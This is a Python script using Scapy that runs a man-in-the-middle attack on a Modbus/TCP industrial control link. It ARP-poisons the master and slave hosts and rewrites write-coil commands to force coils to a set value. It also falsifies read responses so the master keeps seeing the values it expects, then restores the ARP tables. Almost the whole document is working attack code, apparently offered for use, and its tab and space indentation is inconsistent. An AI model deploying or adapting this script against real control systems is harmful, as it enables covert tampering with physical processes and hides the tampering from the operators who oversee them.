#!/usr/bin/python
#import scapy
from scapy.all import *
from scapy.layers.inet import *

#define global variables to hold the master and slave IPs
master_ip = "192.168.15.10"
slave_ip = "192.168.15.9"
# and a dictionary to hold the state the master believes the slave to be in
slave_state = {}
# and a dictionary to hold the transaction id state
trans_dict = {}

def get_mac(ip_address):
    ans,unasn = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    return ans.res[0][1][Ether].src

master_mac = get_mac(master_ip)
slave_mac = get_mac(slave_ip)

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    #Typically do this forever
    try:
   	 send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac))
   	 send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac))
    except:
   	 sys.exit(0)

def cure_target(gateway_ip,gateway_mac,target_ip,target_mac):
    	#Typically do this forever
    	try:
            	send(ARP(op=2,psrc=gateway_ip,hwsrc=gateway_mac,hwdst="ff:ff:ff:ff:ff:ff"))
            	send(ARP(op=2,psrc=target_ip,hwsrc=target_mac,hwdst="ff:ff:ff:ff:ff:ff"))
    	except:
            	sys.exit(0)

def content_rewrite(mbus, new_value):
    # mbus is the modbus command string, it breaks down as follows
    # Transaction ID: 2 bytes
    # Protocol: 2 bytes (always 0x0 0x0)
    # Length: 2 bytes (tells us how long the rest of the string is)
    # Unit id: 1 byte (this would be usefull when we expand beyond a single slave
    # Function Code: 1 byte
    # Data: everything after

    # test to see if we have a string we understand
    if(len(mbus) < 8):
   	 print "modbus command underlength"
   	 return mbus
    # parse out the useful values, use if/elif/else cause we don't have switch
    TransID = mbus[:2]
    length = int(mbus[4:6].encode('hex'), 16)
    command = int(mbus[7].encode('hex'), 16)
    # test to see if the command length makes sense
    if(len(mbus) != length + 6):
   	 print "modbus command length attr not valid"
   	 return mbus

    # we care about reads and writes
    global slave_state
    global trans_dict
    if((command == 1) and (length == 6)): # reading
            	CoilAddr = int(mbus[8:10].encode('hex'), 16)
            	CoilCount = int(mbus[10:12].encode('hex'), 16)
            	BinaryList = []
   	 for x in range(CoilAddr, CoilAddr + CoilCount):
                    	if(x in slave_state):
                            	BinaryList.append(slave_state[x])
                    	else:
                            	BinaryList.append(2) #use 2 to flag no data

   	 trans_dict[TransID] = BinaryList

    elif((command == 5) and (length == 6)): # write coil
   	 CoilAddr = int(mbus[8:10].encode('hex'), 16)
   	 CoilVal = mbus[10:12]
   	 # save the new dictionary entry
   	 if(CoilVal == '\x00\x00'): slave_state[CoilAddr] = 0
   	 else: slave_state[CoilAddr] = 1
   	 # replace with new value
   	 if(new_value == 0):
   		 mbus = mbus[:10] + '\x00\x00'
   	 else:
   		 mbus = mbus[:10] + '\xFF\x00'

    return mbus

def content_mask(mbus):
    	# mbus is the modbus command string, it breaks down as follows
    	# Transaction ID: 2 bytes
    	# Protocol: 2 bytes (always 0x0 0x0)
    	# Length: 2 bytes (tells us how long the rest of the string is)
    	# Unit id: 1 byte (this would be usefull when we expand beyond a single slave
    	# Function Code: 1 byte
    	# Data: everything after

    	# test to see if we have a string we understand
    	if(len(mbus) < 8):
            	print "modbus command underlength"
            	return mbus
    	# parse out the useful values, use if/elif/else cause we don't have switch
    	TransID = mbus[:2]
    	length = int(mbus[4:6].encode('hex'), 16)
    	command = int(mbus[7].encode('hex'), 16)
    	# test to see if the command length makes sense
    	if(len(mbus) != length + 6):
            	print "modbus command length attr not valid"
            	return mbus

    	# we care about reads and writes
    	global slave_state
    global trans_dict
    if((command == 1) and (length >= 4)): # reading
   	 NumberBytes = int(mbus[8].encode('hex'), 16)
   	 BinaryStr = bin(int(mbus[9:].encode('hex'), 16))[2:]
   	 # if we can't find the entry in our transaction dictionary, don't do anything
   	 if(TransID not in trans_dict): return mbus
   	 #print "Binary String From Slave: " + BinaryStr
   	 # now we walk backwards throught the string because we don't know if there is padding
   	 for x in range(-1, -1 - len(trans_dict[TransID]), -1):
   		 num = trans_dict[TransID].pop()
   		 if(x == -1):
   			 if(num == 0):   BinaryStr = BinaryStr[:x] + '0'
                            	elif(num == 1): BinaryStr = BinaryStr[:x] + '1'
   		 else:
   			 if(num == 0):   BinaryStr = BinaryStr[:x] + '0' + BinaryStr[x+1:]
   			 elif(num == 1): BinaryStr = BinaryStr[:x] + '1' + BinaryStr[x+1:]
                   		 # else: do nothing
   	 # BinaryStr is now masked to what it should be
   	 #print "Binary String to Master: " + BinaryStr
   	 # convert it back to hex and append it to the response
   	 HexStr = hex(int(BinaryStr, 2))[2:]
   	 #print "HexStr = " + HexStr
   	 HexStr = HexStr.zfill(len(HexStr) + len(HexStr) % 2) # pad with 0's if needed
   	 mbus = mbus[:9] + HexStr.decode("hex")
   	 # we are done with the transaction at this point
        	del trans_dict[TransID]
    elif((command == 5) and (length == 6)): # write coil
            	CoilAddr = int(mbus[8:10].encode('hex'), 16)
   	 # don't modify if we can't find a record for it
   	 if(CoilAddr not in slave_state): return mbus
            	if(slave_state[CoilAddr] == 0): mbus = mbus[:10] + '\x00\x00'
            	else: mbus = mbus[:10] + '\xFF\x00'
   	 
    return mbus

def packet_wrapper(new_value):
    def packet_adjust(pkt):
   	 # delete the checksums so they get recalculated, we want to do this on every packet
   	 del pkt[IP].chksum
        	del pkt[TCP].chksum

   	 # reasign the proper mac address so we can send it out again.
   	 # if the destination is master
   	 if((pkt[IP].dst == master_ip) and (pkt[Ether].dst != master_mac)):
   		 pkt[Ether].dst = master_mac
   		 if(pkt.haslayer(Raw)):
   			 #this set things back to normal
   			 #print "packet from slave -> master: " + str(pkt[Raw].load).encode("HEX")
   			 pkt[Raw].load = content_mask(pkt[Raw].load)
   		 #recalc chekcsums
   		 pkt = pkt.__class__(str(pkt))
   		 sendp(pkt, verbose=False)
   	 elif((pkt[IP].dst == slave_ip) and (pkt[Ether].dst != slave_mac)):
                	pkt[Ether].dst = slave_mac
   		 if(pkt.haslayer(Raw)):
   			 #change things to how we want them
   			 #print "packet from master -> slave: " + str(pkt[Raw].load).encode("HEX")
   			 pkt[Raw].load = content_rewrite(pkt[Raw].load, new_value)
                	#recalc chekcsums
   		 pkt = pkt.__class__(str(pkt))
   		 sendp(pkt, verbose=False)
   	 #if neither of those cases, drop the packet
    return packet_adjust

print master_mac
print slave_mac

# interject ourselves
poison_target(master_ip,master_mac,slave_ip,slave_mac)
# fiddle with packets
sniff(count=350, filter='tcp port 5020', prn=packet_wrapper(0), store=0)
# set things back as they should be
cure_target(master_ip,master_mac,slave_ip,slave_mac)

